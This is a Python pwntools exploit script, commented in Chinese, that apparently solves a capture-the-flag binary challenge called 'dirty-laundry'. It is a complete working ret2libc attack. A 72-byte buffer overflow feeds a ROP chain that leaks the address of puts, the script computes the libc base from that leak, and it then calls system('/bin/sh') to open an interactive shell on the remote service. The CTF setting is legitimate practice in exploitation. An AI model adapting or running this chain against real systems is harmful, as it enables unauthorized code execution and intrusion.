from pwn import *
import sys

# === 配置部分 ===
context.log_level = 'debug' # 调试必开
context.arch = 'amd64'      # 设置架构

# 远程连接配置
host = 'dirty-laundry.ctf.prgy.in'
port = 1337

# 加载你提供的 Libc 文件
# 确保 'libc.so.6' 在当前目录下！
try:
    libc = ELF('./libc.so.6')
    print("[+] Loaded provided libc.so.6")
except:
    print("[-] Error: libc.so.6 not found in current directory!")
    sys.exit(1)

# 启动连接
if len(sys.argv) > 1 and sys.argv[1] == 'rem':
    p = remote(host, port, ssl=True)
else:
    # 注意：本地如果没有 patch 环境，直接运行可能会报错，建议本地测试也用 remote 验证逻辑
    # 或者你需要用 patchelf 强制本地程序使用这个 libc (进阶操作)
    p = process('./chal') 

# === 准备 Gadgets ===
# 这些地址是题目二进制本身的，不会变
rdi_r14_ret = 0x4011a7
puts_got = 0x404000
puts_plt = 0x401030
main_addr = 0x401217
ret_addr = 0x40101a # 用于栈对齐 (Stack Alignment)

# ================================
# 第一步：泄露 puts 地址
# ================================
p.recvuntil(b"Add your laundry:")

# 构造 Payload 1
# 填充 + RDI=puts_got + 调用puts + 栈对齐 + 返回main
payload1 = b"a"*72 
payload1 += p64(rdi_r14_ret) + p64(puts_got) + p64(0) 
payload1 += p64(puts_plt) 
payload1 += p64(ret_addr) # 关键：防止 main 中的 printf 崩溃
payload1 += p64(main_addr)

p.sendline(payload1)

# ================================
# 第二步：接收并解析 Leak
# ================================
p.recvuntil(b"Laundry complete")

# 稳健的接收逻辑
try:
    recved = p.recvline()
    if recved == b'\n': # 跳过空行
        recved = p.recvline()
    
    # 截取前6字节地址
    if len(recved) > 6:
        leak_data = recved[:6]
    else:
        leak_data = recved[:-1]
        
    puts_addr = u64(leak_data.ljust(8, b"\x00"))
    print(f"[*] Leak puts_addr: {hex(puts_addr)}")

except Exception as e:
    print(f"[-] Leak failed: {e}")
    sys.exit(1)

# ================================
# 第三步：使用本地 libc 文件自动计算
# ================================
# 这一步是精华：把泄露的地址填入 libc 对象，它会自动更新所有符号地址
libc.address = puts_addr - libc.symbols['puts']

print(f"[*] Libc Base: {hex(libc.address)}")

# 直接从 libc 对象中拿 system 和 /bin/sh，绝对准确！
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))

print(f"[*] System: {hex(system_addr)}")
print(f"[*] /bin/sh: {hex(bin_sh_addr)}")

# ================================
# 第四步：Get Shell
# ================================
p.recvuntil(b"Add your laundry:")

payload2 = b"a"*72 
payload2 += p64(rdi_r14_ret) + p64(bin_sh_addr) + p64(0) 
payload2 += p64(system_addr)

p.sendline(payload2)

# 此时应该拿到 Shell 了
p.interactive()
